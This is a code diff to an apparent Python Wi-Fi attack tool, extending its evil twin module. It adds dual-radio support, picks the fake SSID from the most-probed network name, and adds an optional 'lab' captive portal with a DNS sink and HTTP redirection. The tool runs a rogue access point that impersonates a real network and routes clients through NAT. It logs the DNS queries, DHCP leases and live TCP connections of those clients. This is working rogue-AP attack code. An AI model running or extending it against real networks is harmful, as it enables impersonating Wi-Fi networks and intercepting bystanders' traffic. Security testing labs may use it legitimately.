@@ -19,7 +19,17 @@ from rich.table import Table
 
 from app.ui.theme import BORDER_STYLE
 from app.services.runtime_helpers import selected_network_record
+from app.services.system.adapter_roles import dedicated_ap_radio, resolve_ap_interface, role_exclude_ifaces
+from app.services.attacks.evil_twin_lab import (
+    build_dnsmasq_conf,
+    build_hostapd_conf,
+    evaluate_isolation_check,
+    parse_dnsmasq_leases,
+    probe_lease_reachability,
+)
+from app.services.attacks.lab_portal import LabCaptivePortal, PORTAL_BIND_IP
 from cleanup import LAN_CIDR, apply_evil_twin_nat, remove_evil_twin_nat, resolve_evil_twin_log_dir
+from wifi.probes import preferred_evil_twin_ssid, probe_stats_from_app
 
 
 def run_evil_twin_attack(app) -> None:
@@ -77,8 +87,35 @@ def run_evil_twin_attack_impl(app) -> None:
             )
             app.interface_name = resolved
 
+        dedicated = dedicated_ap_radio(app)
+        ap_iface = resolve_ap_interface(app)
+        if dedicated:
+            try:
+                ap_iface = app._ensure_wireless_iface_exists(ap_iface)
+            except FileNotFoundError as exc:
+                app.console.print(f"[warning]AP interface missing ({exc}); using capture radio.[/]")
+                dedicated = False
+                ap_iface = app.interface_name
+                app.ap_interface = None
+            else:
+                app.ap_interface = ap_iface
+                if app.wifi_adapter.is_monitor_mode(ap_iface):
+                    app.console.print(
+                        "[bold blue]AP radio is in monitor mode; switching it to managed for hostapd.[/]"
+                    )
+                    ap_iface = app.wifi_adapter.set_managed_mode(ap_iface, restart_network_manager=False)
+                    app.ap_interface = ap_iface
+                app.console.print(
+                    f"[info]Dual radio:[/] capture [cyan]{app.interface_name}[/] unchanged; "
+                    f"AP [cyan]{ap_iface}[/]"
+                )
+                app.logger.log_evil_twin(f"Dual radio AP={ap_iface} capture={app.interface_name}")
+
+        original_settings["evil_twin_ap_iface"] = ap_iface
+        original_settings["evil_twin_dedicated_ap"] = dedicated
+
         mon_iface = app.wifi_adapter.find_monitor_interface()
-        if mon_iface == app.interface_name:
+        if not dedicated and mon_iface == app.interface_name:
             app.console.print(
                 "[bold blue]Switching to managed mode for Evil Twin AP (hostapd requires AP/managed).[/]"
             )
@@ -87,11 +124,13 @@ def run_evil_twin_attack_impl(app) -> None:
                 app.interface_name,
                 restart_network_manager=False,
             )
+            ap_iface = app.interface_name
+            original_settings["evil_twin_ap_iface"] = ap_iface
 
         original_settings["ip_forward"] = subprocess.check_output(["cat", "/proc/sys/net/ipv4/ip_forward"]).decode().strip()
-        original_settings["interface_state"] = subprocess.check_output(["ip", "addr", "show", app.interface_name]).decode()
+        original_settings["interface_state"] = subprocess.check_output(["ip", "addr", "show", ap_iface]).decode()
         original_settings["route_table"] = subprocess.check_output(["ip", "route", "show"]).decode()
-        original_settings["evil_twin_uplink"] = app._default_ipv4_uplink_interface(exclude={app.interface_name})
+        original_settings["evil_twin_uplink"] = app._default_ipv4_uplink_interface(exclude=role_exclude_ifaces(app))
         original_settings["resolved_status"] = subprocess.run(
             ["systemctl", "is-active", "systemd-resolved"],
             stdout=subprocess.PIPE,
@@ -117,17 +156,46 @@ def run_evil_twin_attack_impl(app) -> None:
 
         default_ssid = ""
         default_channel = "1"
+        default_source = ""
         record = selected_network_record(app)
         if record:
             _bssid, network = record
-            default_ssid = network["ssid"]
+            default_ssid, default_source = preferred_evil_twin_ssid(
+                selected_ssid=str(network.get("ssid") or ""),
+                probe_stats=probe_stats_from_app(app),
+            )
             default_channel = str(network["channel"])
-            app.console.print(f"\n[bold yellow]Selected network: {default_ssid} (Channel: {default_channel})[/]")
+            app.console.print(f"\n[bold yellow]Selected network: {network['ssid']} (Channel: {default_channel})[/]")
+        else:
+            default_ssid, default_source = preferred_evil_twin_ssid(
+                selected_ssid="",
+                probe_stats=probe_stats_from_app(app),
+            )
+
+        if default_source == "probe" and default_ssid:
+            app.console.print(
+                f"[info]No broadcast target SSID; defaulting Evil Twin SSID to most-probed name "
+                f"[cyan]{default_ssid}[/]"
+            )
+        stats = probe_stats_from_app(app)
+        if stats:
+            preview = Table(
+                show_header=True,
+                header_style="bold magenta",
+                box=box.MINIMAL,
+                border_style=BORDER_STYLE,
+                title="[bold blue]Probe SSIDs[/]",
+            )
+            preview.add_column("SSID", style="yellow")
+            preview.add_column("Stations", style="green", justify="right")
+            for stat in stats[:8]:
+                preview.add_row(stat.ssid, str(stat.station_count))
+            app.console.print(preview)
 
         ssid = Prompt.ask("Enter SSID for the Evil Twin", default=default_ssid)
         if not ssid and default_ssid:
             ssid = default_ssid
-            app.console.print(f"[bold cyan]Using selected network SSID: {ssid}[/]")
+            app.console.print(f"[bold cyan]Using default SSID: {ssid}[/]")
         if not _valid_hostapd_ssid(ssid):
             app.console.print("[bold red]Invalid SSID. Use 1-32 bytes without line breaks.[/]")
             return
@@ -143,11 +211,24 @@ def run_evil_twin_attack_impl(app) -> None:
             channel = 1
 
         use_wpa2 = Prompt.ask("Enable WPA2-PSK security? (y/n)", choices=["y", "n"]) == "y"
+        wpa_passphrase = ""
         if use_wpa2:
             wpa_passphrase = Prompt.ask("Enter WPA2 passphrase (8-63 characters)")
             if not _valid_wpa_passphrase(wpa_passphrase):
                 app.console.print("[bold red]Invalid WPA2 passphrase. Use 8-63 characters without line breaks.[/]")
                 return
+
+        isolate_clients = (
+            Prompt.ask("Enable client isolation (block STA-to-STA)? (y/n)", choices=["y", "n"], default="n") == "y"
+        )
+        enable_portal = (
+            Prompt.ask(
+                "Enable lab captive portal (HTTP + DNS sink, no password form)? (y/n)",
+                choices=["y", "n"],
+                default="n",
+            )
+            == "y"
+        )
 
         uplink_precheck = original_settings.get("evil_twin_uplink")
         uplink_ok, uplink_reason = app._evil_twin_nonwifi_internet_uplink_ok(uplink_precheck)
@@ -162,43 +243,31 @@ def run_evil_twin_attack_impl(app) -> None:
                 "(clients can use NAT/DNS if routing stays up after services stop)."
             )
 
-        app.logger.log_evil_twin("Attack started", ssid=ssid, channel=channel, security="WPA2" if use_wpa2 else "Open")
+        app.logger.log_evil_twin(
+            "Attack started",
+            ssid=ssid,
+            channel=channel,
+            security="WPA2" if use_wpa2 else "Open",
+            isolation=isolate_clients,
+            portal=enable_portal,
+        )
         log_dir = app.logger.log_dir / "evil_twin"
         log_dir.mkdir(exist_ok=True)
+        original_settings["evil_twin_isolate"] = isolate_clients
+        original_settings["evil_twin_portal"] = enable_portal
 
-        hostapd_conf = f"""interface={app.interface_name}
-driver=nl80211
-ssid={ssid}
-hw_mode=g
-channel={channel}
-macaddr_acl=0
-auth_algs=1
-ignore_broadcast_ssid=0
-wmm_enabled=1
-ieee80211n=1
-ht_capab=[HT40+][SHORT-GI-40][DSSS_CCK-40]"""
-        if use_wpa2:
-            hostapd_conf += f"""
-wpa=2
-wpa_key_mgmt=WPA-PSK
-wpa_passphrase={wpa_passphrase}
-wpa_pairwise=CCMP
-rsn_pairwise=CCMP"""
-
-        dnsmasq_conf = f"""interface={app.interface_name}
-dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h
-dhcp-option=3,192.168.1.1
-dhcp-option=6,192.168.1.1
-log-queries
-log-dhcp
-log-facility={log_dir}/dnsmasq.log
-log-async=20
-listen-address=192.168.1.1
-bind-interfaces
-no-resolv
-server=8.8.4.4
-server=8.8.8.8
-dhcp-leasefile={log_dir}/dnsmasq.leases"""
+        hostapd_conf = build_hostapd_conf(
+            ap_iface=ap_iface,
+            ssid=ssid,
+            channel=channel,
+            wpa_passphrase=wpa_passphrase if use_wpa2 else None,
+            isolate_clients=isolate_clients,
+        )
+        dnsmasq_conf = build_dnsmasq_conf(
+            ap_iface=ap_iface,
+            log_dir=log_dir,
+            portal=enable_portal,
+        )
 
         app.console.print("[bold blue]Preparing network environment...[/]")
         app.logger.log_evil_twin("Stopping network services")
@@ -209,12 +278,12 @@ dhcp-leasefile={log_dir}/dnsmasq.leases"""
         time.sleep(2)
 
         uplink = original_settings.get("evil_twin_uplink")
-        if uplink and uplink != app.interface_name:
+        if uplink and uplink not in role_exclude_ifaces(app):
             app.console.print(f"[bold blue]Refreshing DHCP on uplink {uplink} (internet exit)...[/]")
             app.logger.log_evil_twin(f"Renewing DHCP on uplink {uplink} after stopping NetworkManager")
             app._renew_dhcp_on_interface(uplink)
             time.sleep(2)
-            uplink_live = app._default_ipv4_uplink_interface(exclude={app.interface_name})
+            uplink_live = app._default_ipv4_uplink_interface(exclude=role_exclude_ifaces(app))
             if uplink_live:
                 uplink = uplink_live
                 original_settings["evil_twin_uplink"] = uplink
@@ -226,11 +295,29 @@ dhcp-leasefile={log_dir}/dnsmasq.leases"""
         app.console.print("[bold blue]Configuring network interface...[/]")
         app.logger.log_evil_twin("Configuring network interface")
         subprocess.run(["rfkill", "unblock", "all"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        subprocess.run(["ip", "link", "set", app.interface_name, "down"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        subprocess.run(["ip", "addr", "flush", "dev", app.interface_name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        subprocess.run(["ip", "link", "set", app.interface_name, "up"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        subprocess.run(["ip", "addr", "add", "192.168.1.1/24", "dev", app.interface_name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        subprocess.run(["ip", "link", "set", ap_iface, "down"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        subprocess.run(["ip", "addr", "flush", "dev", ap_iface], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        subprocess.run(["ip", "link", "set", ap_iface, "up"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        subprocess.run(["ip", "addr", "add", "192.168.1.1/24", "dev", ap_iface], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         time.sleep(2)
+
+        lab_portal = None
+        if enable_portal:
+            portal_log = log_dir / "portal.jsonl"
+            try:
+                lab_portal = LabCaptivePortal(PORTAL_BIND_IP, portal_log)
+                lab_portal.start()
+                original_settings["lab_portal"] = lab_portal
+                app.console.print(
+                    f"[success]Lab captive portal[/] on [cyan]http://{PORTAL_BIND_IP}/[/] "
+                    f"(DNS sink + HTTP DNAT, hits → {portal_log})"
+                )
+                app.logger.log_evil_twin(f"Lab captive portal listening on {PORTAL_BIND_IP}:80")
+            except OSError as exc:
+                lab_portal = None
+                original_settings["lab_portal"] = None
+                app.console.print(f"[warning]Could not bind lab portal: {exc}[/]")
+                app.logger.log_evil_twin(f"Lab portal bind failed: {exc}", error=True)
 
         hostapd_path = log_dir / "hostapd.conf"
         dnsmasq_path = log_dir / "dnsmasq.conf"
@@ -257,10 +344,11 @@ dhcp-leasefile={log_dir}/dnsmasq.leases"""
             raise Exception("Failed to start dnsmasq. Check configuration.")
 
         subprocess.run(["sysctl", "net.ipv4.ip_forward=1"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        exclude = role_exclude_ifaces(app)
         wan_iface = original_settings.get("evil_twin_uplink")
-        if not wan_iface or wan_iface == app.interface_name:
-            wan_iface = app._default_ipv4_uplink_interface(exclude={app.interface_name})
-        if wan_iface == app.interface_name:
+        if not wan_iface or wan_iface in exclude:
+            wan_iface = app._default_ipv4_uplink_interface(exclude=exclude)
+        if wan_iface in exclude:
             wan_iface = None
         if wan_iface and not (Path("/sys/class/net") / wan_iface).is_dir():
             wan_iface = None
@@ -269,7 +357,13 @@ dhcp-leasefile={log_dir}/dnsmasq.leases"""
         app.logger.log_evil_twin("Configuring scoped iptables chains for Evil Twin internet sharing")
         nat_installed = False
         try:
-            apply_evil_twin_nat(ap_iface=app.interface_name, wan_iface=wan_iface, lan_cidr=evil_twin_lan)
+            apply_evil_twin_nat(
+                ap_iface=ap_iface,
+                wan_iface=wan_iface,
+                lan_cidr=evil_twin_lan,
+                portal=enable_portal,
+                isolate_clients=isolate_clients,
+            )
             nat_installed = bool(wan_iface)
         except Exception as exc:
             app.logger.log_evil_twin(f"Scoped iptables NAT setup failed: {exc}", error=True)
@@ -278,10 +372,10 @@ dhcp-leasefile={log_dir}/dnsmasq.leases"""
         if nat_installed:
             app.console.print(
                 f"[success]Internet sharing on[/] — NAT [dim]{evil_twin_lan}[/] → [cyan]{wan_iface}[/] "
-                f"(AP [cyan]{app.interface_name}[/], scoped WIFIANGEL_ET chains)"
+                f"(AP [cyan]{ap_iface}[/], scoped WIFIANGEL_ET chains)"
             )
             app.logger.log_evil_twin(
-                f"NAT/forward: LAN {evil_twin_lan} via AP {app.interface_name} masq out {wan_iface}"
+                f"NAT/forward: LAN {evil_twin_lan} via AP {ap_iface} masq out {wan_iface}"
             )
         elif not wan_iface:
             app.console.print(
@@ -289,6 +383,11 @@ dhcp-leasefile={log_dir}/dnsmasq.leases"""
                 "Connect Ethernet (default route) or a second online interface.[/]"
             )
             app.logger.log_evil_twin("No WAN iface; NAT skipped (no global FORWARD ACCEPT)")
+
+        if isolate_clients:
+            app.console.print("[info]Client isolation on: hostapd ap_isolate=1 and FORWARD DROP on AP iface.[/]")
+        if enable_portal and not lab_portal:
+            app.console.print("[warning]Portal selected but HTTP listener is not running.[/]")
 
         try:
             acct = subprocess.run(
@@ -315,6 +414,7 @@ dhcp-leasefile={log_dir}/dnsmasq.leases"""
             clients_connected = {}
             tcp_connections: list[tuple[str, str, str]] = []
             tcp_poll = {"last": 0.0}
+            isolation_check = evaluate_isolation_check([], {}, isolated=isolate_clients)
             cache_dir = Path("/tmp/wifiangel_evil_twin")
             cache_dir.mkdir(exist_ok=True)
             session_file = cache_dir / f"clients_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
@@ -352,6 +452,25 @@ dhcp-leasefile={log_dir}/dnsmasq.leases"""
                         tcp_connections = app._evil_twin_fetch_established_tcp_for_lan()
                     except Exception:
                         tcp_connections = []
+                    if isolate_clients:
+                        try:
+                            lease_text = (
+                                leases_file.read_text(encoding="utf-8", errors="replace")
+                                if leases_file.exists()
+                                else ""
+                            )
+                            parsed_leases = parse_dnsmasq_leases(lease_text)
+                            ping_ok = probe_lease_reachability(
+                                [item.ip for item in parsed_leases],
+                                ap_iface,
+                            )
+                            isolation_check = evaluate_isolation_check(
+                                parsed_leases,
+                                ping_ok,
+                                isolated=True,
+                            )
+                        except Exception:
+                            pass
 
                 tcp_table = Table(show_header=True, header_style="bold blue", box=box.MINIMAL, border_style=BORDER_STYLE, title="[bold blue]Active TCP ESTABLISHED Connections[/] (refresh ~5s, uses ss/netstat)")
                 tcp_table.add_column("Local Address", style="cyan")
@@ -418,10 +537,39 @@ dhcp-leasefile={log_dir}/dnsmasq.leases"""
                         app._evil_twin_format_bytes(b),
                     )
 
+                lab_table = Table(
+                    show_header=True,
+                    header_style="bold cyan",
+                    box=box.MINIMAL,
+                    border_style=BORDER_STYLE,
+                    title="[bold blue]Lab portal / isolation[/]",
+                )
+                lab_table.add_column("Portal", style="cyan")
+                lab_table.add_column("HTTP hits", style="green", justify="right")
+                lab_table.add_column("Isolation", style="yellow")
+                lab_table.add_column("Two-lease check", style="magenta")
+                if lab_portal:
+                    portal_state = "HTTP + DNS sink"
+                    hit_count = str(lab_portal.hit_count)
+                elif enable_portal:
+                    portal_state = "failed"
+                    hit_count = "0"
+                else:
+                    portal_state = "off"
+                    hit_count = "0"
+                iso_label = "on" if isolate_clients else "off"
+                lab_table.add_row(
+                    portal_state,
+                    hit_count,
+                    iso_label,
+                    f"{isolation_check.status}: {isolation_check.detail}",
+                )
+
                 live.update(
                     Group(
                         status_table,
                         Panel(clients_table, border_style=BORDER_STYLE, box=box.MINIMAL),
+                        Panel(lab_table, border_style=BORDER_STYLE, box=box.MINIMAL),
                         Panel(dns_table, border_style=BORDER_STYLE, box=box.MINIMAL),
                         Panel(tcp_table, border_style=BORDER_STYLE, box=box.MINIMAL),
                     )
@@ -445,6 +593,14 @@ def cleanup_evil_twin(app, original_settings, log_dir=None) -> None:
     app.logger.log_evil_twin("Starting cleanup process")
 
     try:
+        portal = original_settings.get("lab_portal")
+        if portal is not None:
+            try:
+                portal.stop()
+            except Exception:
+                pass
+            original_settings["lab_portal"] = None
+
         cache_dir = Path("/tmp/wifiangel_evil_twin")
         if cache_dir.exists():
             try:
@@ -487,16 +643,21 @@ def cleanup_evil_twin(app, original_settings, log_dir=None) -> None:
         except Exception:
             app.logger.log_evil_twin("Failed to remove WIFIANGEL_ET iptables chains", error=True)
 
-        if "mon" in app.interface_name:
+        ap_iface = original_settings.get("evil_twin_ap_iface") or app.interface_name
+        dedicated = bool(original_settings.get("evil_twin_dedicated_ap"))
+        restore_iface = ap_iface if dedicated else app.interface_name
+
+        if not dedicated and "mon" in str(restore_iface):
             try:
-                subprocess.run(["airmon-ng", "stop", app.interface_name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-                app.interface_name = app.interface_name.replace("mon", "")
+                subprocess.run(["airmon-ng", "stop", restore_iface], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                app.interface_name = str(restore_iface).replace("mon", "")
+                restore_iface = app.interface_name
             except Exception:
                 app.logger.log_evil_twin("Failed to stop monitor mode using airmon-ng", error=True)
 
-        subprocess.run(["ip", "link", "set", app.interface_name, "down"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        subprocess.run(["iw", app.interface_name, "set", "type", "managed"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        subprocess.run(["ip", "link", "set", app.interface_name, "up"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        subprocess.run(["ip", "link", "set", restore_iface, "down"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        subprocess.run(["iw", restore_iface, "set", "type", "managed"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        subprocess.run(["ip", "link", "set", restore_iface, "up"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
         if original_settings.get("resolved_status") == "active":
             subprocess.run(["systemctl", "restart", "systemd-resolved"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
@@ -506,13 +667,19 @@ def cleanup_evil_twin(app, original_settings, log_dir=None) -> None:
             subprocess.run(["systemctl", "restart", "NetworkManager"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
         app.console.print("[success]Network settings restored successfully.[/]")
-        app.console.print("[success]Interface switched back to managed mode.[/]")
+        if dedicated:
+            app.console.print(f"[success]AP interface [cyan]{restore_iface}[/] set to managed. Capture radio unchanged.[/]")
+        else:
+            app.console.print("[success]Interface switched back to managed mode.[/]")
         app.console.print("[info]You can now manually connect to your WiFi network.[/]")
     except Exception as exc:
         app.logger.log_evil_twin(f"Error during cleanup: {str(exc)}", error=True)
         app.console.print(f"[bold red]Error during cleanup: {str(exc)}[/]")
     finally:
-        verify_network_services(app)
+        if original_settings.get("evil_twin_dedicated_ap"):
+            _ensure_service_active(app, "NetworkManager", warn="NetworkManager")
+        else:
+            verify_network_services(app)
 
 
 def verify_network_services(app) -> None:
